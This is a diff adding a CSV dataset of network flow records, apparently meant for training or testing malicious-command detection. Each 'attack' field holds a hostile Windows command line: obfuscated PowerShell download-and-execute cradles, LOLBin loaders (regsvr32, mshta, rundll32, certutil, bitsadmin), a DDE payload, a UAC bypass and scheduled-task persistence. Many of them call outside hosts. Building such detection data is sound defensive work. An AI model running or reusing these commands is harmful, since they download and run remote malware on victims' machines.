@@ -1,0 +1,58 @@
+field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
+ID,100.163.44.160,203.139.113.8,62112,80,6,"wmic.exe os get ved5hit39, 25hit8, numberofusers /format:""https://storage.googleapis.com/ultramaker/09/v.txt""
+",55,880
+ID,103.110.204.140,163.62.129.254,8889,63745,6,"wmic.exe os get QMUTSQPK, JUXKBVOK, LNFTZKMH, freephyscialmemory /format:""https://storage.googleapis.com/ultramaker/08/vv.txt""
+",64,1016
+ID,107.14.191.181,203.139.123.144,443,51746,6,"bitsadmin.exe /transfer msd5 /priority foreground https://storage.googleapis.com/ultramaker/x/ 09/falcvonxrenwb.jpg.zip.log?
+",63,1000
+ID,109.196.225.86,203.139.121.234,52816,30303,6,"certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z
+",35,560
+ID,104.236.219.104,163.62.107.170,443,36794,6,"regsvr32.exe /s falxconxrenw64.~
+",17,264
+ID,109.58.252.70,203.139.121.234,30303,36694,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL].asp') | iex
+",57,912
+ID,114.242.110.214,163.62.224.249,21358,443,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\[Same Random Key]').[Random Value Name])));
+",107,1704
+ID,116.58.147.90,203.139.121.234,44410,30303,6,"powershell.exe -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]: ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('https://somerandomevildomain.xx /somerandomflie'))
+",116,1848
+ID,114.242.111.69,203.139.126.248,41900,443,6,"Regsvr.exe /s /u /i:http://xxx.somerandomevildomain.xx/evilpath.xml scrobj.dl
+",39,624
+ID,117.234.88.39,163.62.71.17,443,61585,6,"powershell.exe ""if(!([string](Get-WMIobject -Namespace root\Subscription -Class __FilterToConsumerBinding )).contains('SCM Event Filter')) {IEX(New-Object Net.WebClient).DownloadString('[URL]')}""
+",98,1568
+ID,13.5.165.135,203.139.121.234,30303,59386,6,"cmd.exe Cmd/C ""Set ctSI= .( ([StriNG]$vERbOSEPrEFeReNce)[1,3]+'x'-JOIN'') (NEW-ObJEct io.CompreSSion.DefLAtestrEaM([IO.MemOrYStReam] [sYsTEm.COnVERT]::frOmbASE64STrINg('PZBda4MwFIb/Si4CqbhGuu3GBqGs28CxrowySmE3MT3W1JhIetAO8b9PZevted7znA/6tdWJhXbusjMoJB+AfA/Z2miwKGiaNgkrEOtlFEmPF4tQcuWq6ICf1q3+SCYLLZUHibqRE453h+1LXP4HlK4L8BXw2kRHiTJS7Q0V0g/DcncdG3nmo8fF+nyj8gLGyMo12p4mMy5OjO9qo3HGViwQdLN/Jwlh9w8xE7TKfULBNkuEqg7ZNwtHHjIOV2Aid8OOqpjRzdsT0ZaM5wUd+p+ODm/gz661xsnjqzYwZe7IKAxEahtXwjwdpFNFZIOnFL2SqIqu738B') ,[IO.CompRessiON.cOmpreSSIoNmoDE]::dECOmPreSs ) ^|FOReach { NEW-ObJEct sYstem.Io.StrEAmreAdeR( $_,[teXT.EnCoDiNG]::aSCii) } ^| foREaCh { $_.rEADtoENd() }) &&POwERshelL $oB84i = [tyPe]( \""{3}{0}{1}{2}\""-F'n','MEN','t','eNvirO' ) ; ${executiOnCONtExt}.\""InVokec`Om`ma`ND\"".\""in`VO`KES`CrIPT\""( ( ( GET-IteM variabLE:oB84i ).vaLuE::( \""{1}{3}{2}{0}\"" -f 'E','ge','NVIroNmEnTVARiABl','TE' ).Invoke( (\""{0}{1}\"" -f'cTs','I'),( \""{1}{2}{0}\""-f 'S','PR','oCEs') ) ))""
+",483,7720
+ID,121.20.245.187,163.62.38.66,443,63008,6,"powershell.exe ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe($nsadasd = &(new-object) random;$YYU = .(new-object) System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = http://lecap-services .fr/wiB9s/?http://nikitinskysport .ru/R5ytZ/?http://beauty-tea .com/hB2JAMO/?http://zekiatagur .com/gCWu/?http://arkonziv.com/Site7_Pixelhobbies/iV1PKqL/.Split(?);$SDC = $env:public  \  $NSB  ('.exe');foreach($asfc in $ADCX){try{$YYU.""Do`Wnl`OadFI`le""($asfc.""ToStr`i`Ng""(), $SDC);&(Invoke-Item)($SDC);break;}catch{})
+",287,4584
+ID,121.20.245.187,163.62.38.66,443,63043,6,"powershell.exe set-item ('variable:skeail') ( [type]( 'environment' ) ) ; ( .('ls') ('contextexecutionvariable') ).value.invokecommand.('invokescript' ).invoke( ( ${skeail}::('getenvironmentvariable').invoke( 'diy',('process' ))))
+",116,1848
+ID,130.85.161.127,203.139.121.234,30303,50356,6,"powershell.exe SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \""{2}{3}{1}{0}\""-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \""{4}{0}{7}{1}{5}{2}{3}{6}\""-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\""VaL`UE\"".\""iN`VO`k`eCom`MANd\"".( \""{3}{1}{2}{0}\"" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\""{0}{4}{1}{2}{5}{3}\"" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\""{1}{0}\""-f's','PrOCeS' ))) )
+",210,3360
+ID,133.4.84.228,3.192.64.103,46154,443,6,"powershell.exe $zWC='IUA';$QHY='http://trabanatours.com/u@http://pizzeriarondo.si/z8cG@http://diahmarsidi.com/MPCTKG@http://ogrodyusmiechu.pl/iubv8v@http://assurance-charente.fr/sfh'.Split('@');$aBp=([System.IO.Path]::GetTempPath()+'\mQN.exe');$pdZ =New-Object -com 'msxml2.xmlhttp';$tpk = New-Object -com 'adodb.stream';foreach($uiA in $QHY){try{$pdZ.open('GET',$uiA,0);$pdZ.send();$tpk.open();$tpk.type = 1;$tpk.write($pdZ.responseBody);$tpk.savetofile($aBp);Start-Process $aBp;break}catch{}}
+",248,3960
+ID,133.4.101.165,54.156.209.62,48196,443,6,"schtasks.exe /Create /sc MINUTE /MO 1 /TN WindowsUpdate /TR ""Powershell -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\""http://118.193.251.137/dropbox/?p=BT67HU78HZ\\\"",\\\""$env:public\svchost325.vbs\\\"");(New-Object -com Shell.Application).ShellExecute(\\\""$env:public\svchost325.vbs\\\"");""
+",153,2440
+ID,133.4.101.166,35.168.18.86,39274,443,6,"powershell.exe -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\'http[:]//118.193.251[.]137/dropbox/?p=BT67HU78HZ\\\',\\\'$env:public\svchost325.vbs\\\');(New-Object -com Shell.Application).ShellExecute(\\\'$env:public\svchost325.vbs\\\');'
+",126,2016
+ID,121.20.245.187,163.62.38.66,443,63006,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\FTZLZTRLAPJCLE').ZRAKUTR)));
+",99,1584
+ID,133.4.101.167,54.221.194.13,41038,443,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL],'%TEMP%\\pu457.exe') & reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d %TEMP%\\pu457.exe /f & eventvwr.exe & PING -n 15 127.0.0.1>nul & %TEMP%\\pu457.exe
+",137,2192
+ID,121.20.245.187,163.62.38.66,443,63044,6,"mshta.exe javascript:d7hcQ4a=""vn"";n0a=new%20ActiveXObject(""WScript.Shell"");Rtf7j=""HIPc"";X18ycI=n0a.RegRead(""HKCU\\software\\tN32795\\74gjfzcsfI"");jM5IV6m=""QJ"";eval(X18ycI);XIaL0uze=""lYuLz1vG""
+",96,1536
+ID,121.20.245.187,163.62.38.66,443,63045,6,"winword.exe {ddeauto c:\\windows\\system32\\cmd.exe ""/k powershell IEX(New-Object Net.WebClient).Downloadstring('[URL]' )"" \* MERGEFORmAT}
+",70,1112
+ID,133.4.101.171,54.224.71.108,46584,443,6,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject('script:http://dx30z30a4t11l7be .lieslow[.]faith/5aad4b91a0da20d4faab0991bdbe7138')
+",84,1344
+ID,133.16.198.53,60.214.206.106,23,43295,6,"powershell.exe ""-Command IEX (New-Object('Net.WebClient')).'DoWnloadsTrInG'('http://spacemantra.biz/blyat.jpeg')""
+",57,912
+ID,133.4.84.228,3.192.64.103,46172,443,6,"rundll32.exe javascript:”..mshtml,RunHTMLApplication “;eval((new%20ActiveXObject(“WScript.Shell”)).RegRead(“HKCUSoftwareMicrosoftActive%20SetupInstalled%20Components{72507C54-3577-4830-815B-310007F6135A}JavaScript”));close();
+",116,1844
+ID,133.4.84.228,54.86.226.217,47052,443,6,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write(""\74script language=jscript.encode>""+(new%20ActiveXObject(""WScript.Shell"")).RegRead(""HKCU\\software\\microsoft\\windows\\currentversion\\run\\"")+""\74/script>"")
+",116,1856
+ID,133.4.84.228,54.86.226.217,47066,443,6,"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('http://rabbitons[.]pw/cache') | iex } else {(new-object Net.WebClient).DownloadString('http://rabbitons[.]pw/css') | iex}
+",137,2184
+ID,133.4.85.105,3.192.64.103,58396,443,6,"cmd.exe /K poweRshell.exe -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile('http://skycpa. in/file.php','%TEMP%\Y.ps1'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1
+",132,2104
+ID,133.4.85.105,3.192.64.103,58400,443,6,"powershell.exe ""[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::LocalMachine.OpenSubkey(‘SOFTWARE’).GetValue(‘$77stager’)).EntryPoint.Invoke($Null,$Null))""
+",84,1336
+ID,133.4.85.105,3.192.64.103,58420,443,6,"powershell.exe ""$hjf=New-Object System.Net.WebClient;$hjf.Proxy=[System.N^et.WebRequest]::GetSystemWebProxy();$hjf.Proxy.Credentials=[System.N^et.CredentialCache]::DefaultCredentials;$hjf.Headers.Add('User-Agent','M/5.18');$r=$hjf.DownloadString('http://193.109.69.5/gggm/upl/txt');IEX $r""",145,2312
